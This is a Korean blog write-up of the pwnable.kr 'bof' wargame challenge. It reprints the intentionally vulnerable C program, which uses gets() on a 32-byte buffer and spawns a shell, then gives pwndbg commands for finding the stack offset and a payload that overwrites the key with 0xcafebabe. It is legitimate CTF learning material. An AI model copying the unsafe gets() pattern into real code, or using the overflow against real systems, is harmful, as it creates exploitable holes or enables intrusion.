---
layout: post
title: "pwnable.kr - bof"
date: 2026-02-11
categories: pwnable BOF wargame
---
# bof
> 나나가 버퍼 오버플로우가 가장 흔한 소프트웨어 취약점이라던데.. 진짜인가요??

# 문제 개요
* pwnable.kr - Toddler's Bottle
* 5 point
* files: `bof`, `bof.c`, `readme`
# 프로그램 분석 
키 값이 0xcafebabe라면 쉘을 실행하지만 키값을 바꾸는 로직은 그 어디에도 없습니다..
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```
# 설계 및 시나리오
버퍼가 32 바이트인데 반해 gets 함수로 무한정 받을 수 있습니다 BOF하기 더할나위 없이 좋습니다.
key와 버퍼가 같은 스택 프레임안에 존재하고 key가 매게변수로써 먼저 스택에 존재할것이고 따라서 조작이 가능할것입니다. 따라서 둘 사이의 오프셋을 구하면 쉽게 조작이 가능합니다.
# 익스플로잇
pwndbg가 서버에 존재하므로 귀찮게 로컬로 받을 필요없이 다음 명령어로 오프셋을 계산해줍니다
```
pwndbg> info proc mappings
pwndbg> info registers
pwndbg> find <ebp> <biggest stack addr> 0xdeadbeef # getting address that you want to smash
pwndbg> p $ebp - 0xac # getting address of vulnerable buffer
```
이후 다음과 같이 페이로드를 보내어 쉘을 탈취할 수있습니다
```
payload: b'A' * <offset of them> + p32(0xcafebabe) or b'\xbe\xba\xfe\xca'
ls
cat flag
```
# 결과
```
$ ls
$ cat flag
<flag>
```
bof에서 오프셋 계산의 정확성을 다시 한번 일깨워준 문제...